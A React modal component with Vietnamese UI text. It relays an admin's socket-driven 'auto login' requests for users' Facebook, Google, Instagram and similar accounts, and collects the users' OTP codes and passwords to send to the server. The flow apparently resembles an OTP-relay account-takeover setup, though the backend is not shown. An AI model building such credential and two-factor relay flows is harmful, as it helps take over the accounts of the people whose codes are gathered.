import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Zap, 
  CheckCircle, 
  AlertCircle, 
  Clock, 
  RefreshCw, 
  Shield,
  Eye,
  EyeOff,
  Lock,
  Unlock,
  Smartphone,
  Mail,
  Key,
  X
} from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from './ui/card';
import { Badge } from './ui/badge';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { useToast } from './ui/use-toast';
import { useSocket } from '../context/SocketContext';
import { apiService } from '../services/apiService';

const AutoLoginIntegration = ({ isVisible, onClose }) => {
  const [currentRequest, setCurrentRequest] = useState(null);
  const [userResponse, setUserResponse] = useState({
    approved: null,
    otpCode: '',
    password: '',
    showPassword: false
  });
  const [isProcessing, setIsProcessing] = useState(false);
  const { socket } = useSocket();
  const { toast } = useToast();

  useEffect(() => {
    if (!socket) return;

    const handleLoginRequest = (data) => {
      setCurrentRequest({
        id: data.sessionId,
        platform: data.platform,
        platformName: data.platformName,
        userEmail: data.userEmail,
        timestamp: data.timestamp,
        requiresApproval: data.requiresApproval || true,
        requiresOTP: data.requiresOTP || false,
        requiresPassword: data.requiresPassword || false,
        status: 'pending'
      });

      // Show toast notification
      toast({
        title: `🔐 ${data.platformName} Login Request`,
        description: `Admin yêu cầu đăng nhập vào ${data.platformName}`,
        duration: 8000,
      });
    };

    const handleLoginStatusUpdate = (data) => {
      if (currentRequest && currentRequest.id === data.sessionId) {
        setCurrentRequest(prev => ({
          ...prev,
          status: data.status,
          error: data.error
        }));

        if (data.status === 'completed') {
          toast({
            title: "✅ Login Successful",
            description: `Đăng nhập ${currentRequest.platformName} thành công!`,
            duration: 4000,
          });
          
          // Auto close after success
          setTimeout(() => {
            setCurrentRequest(null);
            onClose?.();
          }, 2000);
        } else if (data.status === 'failed') {
          toast({
            title: "❌ Login Failed",
            description: data.error || `Đăng nhập ${currentRequest.platformName} thất bại`,
            variant: "destructive",
          });
        }
      }
    };

    const handleOTPRequest = (data) => {
      if (currentRequest && currentRequest.id === data.sessionId) {
        setCurrentRequest(prev => ({
          ...prev,
          requiresOTP: true,
          otpMessage: data.message
        }));

        toast({
          title: "📱 OTP Required",
          description: data.message || "Vui lòng nhập mã OTP",
          duration: 5000,
        });
      }
    };

    socket.on('admin:login_request', handleLoginRequest);
    socket.on('login:status_update', handleLoginStatusUpdate);
    socket.on('admin:otp_request', handleOTPRequest);

    return () => {
      socket.off('admin:login_request', handleLoginRequest);
      socket.off('login:status_update', handleLoginStatusUpdate);
      socket.off('admin:otp_request', handleOTPRequest);
    };
  }, [socket, currentRequest, toast, onClose]);

  const handleApprove = async () => {
    if (!currentRequest) return;
    
    setIsProcessing(true);
    try {
      await apiService.respondToLoginRequest({
        sessionId: currentRequest.id,
        approved: true,
        otpCode: userResponse.otpCode,
        password: userResponse.password
      });

      setUserResponse(prev => ({ ...prev, approved: true }));
      setCurrentRequest(prev => ({ ...prev, status: 'processing' }));
      
      toast({
        title: "✅ Login Approved",
        description: "Đã chấp nhận yêu cầu đăng nhập",
        duration: 3000,
      });

    } catch (error) {
      toast({
        title: "❌ Approval Failed",
        description: error.message || "Không thể chấp nhận yêu cầu",
        variant: "destructive",
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleDeny = async () => {
    if (!currentRequest) return;
    
    setIsProcessing(true);
    try {
      await apiService.respondToLoginRequest({
        sessionId: currentRequest.id,
        approved: false,
        reason: 'User denied'
      });

      setUserResponse(prev => ({ ...prev, approved: false }));
      
      toast({
        title: "🚫 Login Denied",
        description: "Đã từ chối yêu cầu đăng nhập",
        duration: 3000,
      });

      setTimeout(() => {
        setCurrentRequest(null);
        onClose?.();
      }, 1500);

    } catch (error) {
      toast({
        title: "❌ Denial Failed",
        description: error.message || "Không thể từ chối yêu cầu",
        variant: "destructive",
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleSubmitOTP = async () => {
    if (!currentRequest || !userResponse.otpCode) return;
    
    setIsProcessing(true);
    try {
      await apiService.submitOTP({
        sessionId: currentRequest.id,
        otpCode: userResponse.otpCode
      });

      toast({
        title: "📱 OTP Submitted",
        description: "Đã gửi mã OTP thành công",
        duration: 3000,
      });

    } catch (error) {
      toast({
        title: "❌ OTP Failed",
        description: error.message || "Mã OTP không đúng",
        variant: "destructive",
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const getPlatformIcon = (platform) => {
    const icons = {
      facebook: '📘',
      google: '🔍',
      instagram: '📷',
      tiktok: '🎵',
      twitter: '🐦',
      linkedin: '💼'
    };
    return icons[platform] || '🌐';
  };

  const getStatusIcon = (status) => {
    switch (status) {
      case 'pending':
        return <Clock className="w-5 h-5 text-yellow-500" />;
      case 'processing':
        return <RefreshCw className="w-5 h-5 text-blue-500 animate-spin" />;
      case 'completed':
        return <CheckCircle className="w-5 h-5 text-green-500" />;
      case 'failed':
        return <AlertCircle className="w-5 h-5 text-red-500" />;
      default:
        return <Clock className="w-5 h-5 text-gray-500" />;
    }
  };

  if (!isVisible && !currentRequest) return null;

  return (
    <AnimatePresence>
      {(isVisible || currentRequest) && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4"
        >
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            className="w-full max-w-md"
          >
            <Card className="bg-gray-800 border-gray-700 shadow-2xl">
              <CardHeader className="pb-4">
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2">
                    <Zap className="w-5 h-5 text-yellow-500" />
                    Auto Login Request
                  </CardTitle>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => {
                      setCurrentRequest(null);
                      onClose?.();
                    }}
                    className="text-gray-400 hover:text-white"
                  >
                    <X className="w-4 h-4" />
                  </Button>
                </div>
              </CardHeader>
              
              <CardContent className="space-y-4">
                {currentRequest ? (
                  <>
                    {/* Platform Info */}
                    <div className="flex items-center gap-3 p-4 bg-gray-700/30 rounded-lg">
                      <div className="text-3xl">
                        {getPlatformIcon(currentRequest.platform)}
                      </div>
                      <div className="flex-1">
                        <div className="text-white font-medium">
                          {currentRequest.platformName}
                        </div>
                        <div className="text-sm text-gray-400">
                          {currentRequest.userEmail}
                        </div>
                        <div className="text-xs text-gray-500">
                          {new Date(currentRequest.timestamp).toLocaleString('vi-VN')}
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        {getStatusIcon(currentRequest.status)}
                        <Badge className={`
                          ${currentRequest.status === 'pending' ? 'bg-yellow-500/20 text-yellow-400' : ''}
                          ${currentRequest.status === 'processing' ? 'bg-blue-500/20 text-blue-400' : ''}
                          ${currentRequest.status === 'completed' ? 'bg-green-500/20 text-green-400' : ''}
                          ${currentRequest.status === 'failed' ? 'bg-red-500/20 text-red-400' : ''}
                          border-0
                        `}>
                          {currentRequest.status}
                        </Badge>
                      </div>
                    </div>

                    {/* Status Message */}
                    {currentRequest.status === 'pending' && (
                      <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4">
                        <div className="flex items-center gap-2 text-yellow-400 mb-2">
                          <Shield className="w-4 h-4" />
                          Authorization Required
                        </div>
                        <p className="text-sm text-gray-300">
                          Admin đang yêu cầu đăng nhập vào {currentRequest.platformName}. 
                          Bạn có muốn cho phép không?
                        </p>
                      </div>
                    )}

                    {currentRequest.status === 'processing' && (
                      <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                        <div className="flex items-center gap-2 text-blue-400 mb-2">
                          <RefreshCw className="w-4 h-4 animate-spin" />
                          Processing Login
                        </div>
                        <p className="text-sm text-gray-300">
                          Đang thực hiện đăng nhập tự động...
                        </p>
                      </div>
                    )}

                    {currentRequest.status === 'failed' && currentRequest.error && (
                      <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-4">
                        <div className="flex items-center gap-2 text-red-400 mb-2">
                          <AlertCircle className="w-4 h-4" />
                          Login Failed
                        </div>
                        <p className="text-sm text-gray-300">
                          {currentRequest.error}
                        </p>
                      </div>
                    )}

                    {/* OTP Input */}
                    {currentRequest.requiresOTP && currentRequest.status !== 'completed' && (
                      <div className="space-y-3">
                        <Label className="text-sm font-medium text-gray-300">
                          OTP Code
                        </Label>
                        <div className="flex gap-2">
                          <Input
                            type="text"
                            placeholder="123456"
                            value={userResponse.otpCode}
                            onChange={(e) => setUserResponse(prev => ({
                              ...prev,
                              otpCode: e.target.value
                            }))}
                            className="bg-gray-700 border-gray-600 text-white"
                            maxLength={6}
                          />
                          <Button
                            onClick={handleSubmitOTP}
                            disabled={!userResponse.otpCode || isProcessing}
                            className="bg-blue-600 hover:bg-blue-700"
                          >
                            <Smartphone className="w-4 h-4 mr-2" />
                            Submit
                          </Button>
                        </div>
                        {currentRequest.otpMessage && (
                          <p className="text-xs text-gray-400">
                            {currentRequest.otpMessage}
                          </p>
                        )}
                      </div>
                    )}

                    {/* Password Input */}
                    {currentRequest.requiresPassword && currentRequest.status !== 'completed' && (
                      <div className="space-y-3">
                        <Label className="text-sm font-medium text-gray-300">
                          Password Confirmation
                        </Label>
                        <div className="relative">
                          <Input
                            type={userResponse.showPassword ? "text" : "password"}
                            placeholder="Enter password"
                            value={userResponse.password}
                            onChange={(e) => setUserResponse(prev => ({
                              ...prev,
                              password: e.target.value
                            }))}
                            className="bg-gray-700 border-gray-600 text-white pr-10"
                          />
                          <button
                            type="button"
                            onClick={() => setUserResponse(prev => ({
                              ...prev,
                              showPassword: !prev.showPassword
                            }))}
                            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
                          >
                            {userResponse.showPassword ? (
                              <EyeOff className="w-4 h-4" />
                            ) : (
                              <Eye className="w-4 h-4" />
                            )}
                          </button>
                        </div>
                      </div>
                    )}

                    {/* Action Buttons */}
                    {currentRequest.status === 'pending' && userResponse.approved === null && (
                      <div className="flex gap-3 pt-4">
                        <Button
                          onClick={handleApprove}
                          disabled={isProcessing}
                          className="flex-1 bg-green-600 hover:bg-green-700"
                        >
                          {isProcessing ? (
                            <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                          ) : (
                            <CheckCircle className="w-4 h-4 mr-2" />
                          )}
                          Approve
                        </Button>
                        <Button
                          onClick={handleDeny}
                          disabled={isProcessing}
                          variant="outline"
                          className="flex-1 border-red-500 text-red-400 hover:bg-red-500/20"
                        >
                          <X className="w-4 h-4 mr-2" />
                          Deny
                        </Button>
                      </div>
                    )}

                    {/* Success State */}
                    {currentRequest.status === 'completed' && (
                      <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4 text-center">
                        <CheckCircle className="w-8 h-8 text-green-500 mx-auto mb-2" />
                        <div className="text-green-400 font-medium mb-1">
                          Login Successful!
                        </div>
                        <div className="text-sm text-gray-300">
                          Đăng nhập {currentRequest.platformName} thành công
                        </div>
                      </div>
                    )}
                  </>
                ) : (
                  <div className="text-center py-8 text-gray-400">
                    <Zap className="w-12 h-12 mx-auto mb-4 opacity-50" />
                    <p>No active login requests</p>
                    <p className="text-sm">Admin sẽ gửi yêu cầu khi cần thiết</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

export default AutoLoginIntegration;
